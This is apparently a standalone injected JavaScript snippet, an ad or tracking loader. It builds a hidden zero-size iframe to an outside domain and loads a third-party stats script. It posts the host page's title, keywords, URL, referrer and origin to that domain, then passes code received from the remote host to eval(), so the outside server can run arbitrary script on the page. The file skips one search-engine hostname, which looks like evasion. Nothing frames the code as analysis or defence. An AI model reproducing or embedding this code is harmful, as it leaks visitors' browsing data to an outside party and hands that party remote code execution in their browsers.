(function () {
    var iframe_src = "https://ad1.789zuhao.cn/home_task";
    var js_domain = "http://ad1.789zuhao.cn";
    //var url_a = "https://www1.52crlab.com/home_upnum";
    var mydiv_iframe=document.createElement("iframe");mydiv_iframe.onload=function(){ resize(); };mydiv_iframe.src=iframe_src;mydiv_iframe.style="width:0%;height: 0%;display: block;border: none; position: fixed;top: 0;right: 0;";mydiv_iframe.id="845234asdflmasodu43234";document.body.appendChild(mydiv_iframe);
    var script1 = document.createElement("script");
    script1.src = "https://s9.cnzz.com/z_stat.php?id=1277878733&web_id=1277878733";
    document.body.appendChild(script1);
    var resize = function() {
        var ifr = document.getElementById('845234asdflmasodu43234');
        var webtitle = document.title;
        var keywords = document.getElementsByName("keywords")[0];
        if (keywords == undefined) {
            keywords = "";
        } else {
            keywords = keywords.content;
        }
        var domain = location.href;
        var hostname = location.hostname;
        var origin = location.origin;
        var port = location.port;
        var obj = {
            'webtitle': webtitle,
            'keywords': keywords,
            'hostname': hostname,
            'domain': domain,
            'referrer': document.referrer,
            'origin': origin,
            'port': port
        };
        if (hostname != 'www.so.com') {
            ifr.contentWindow.postMessage(JSON.stringify(obj), js_domain);
            window.addEventListener('message', function (e) {
                var res = JSON.parse(e.data);
                eval(res.body);
                // var ad_id = res.ad_id;
                // setTimeout(function () {
                //     var xmlhttp = new XMLHttpRequest();
                //     xmlhttp.onreadystatechange = function (e1) {
                //
                //     };
                //     xmlhttp.open('post', url_a, true);
                //     xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                //     xmlhttp.send("ad_id=" + ad_id);
                // }, 0);
            });
        }
    }
})();
function guangbi_ad(id) {
    document.getElementById(id).style.display = "none";
}
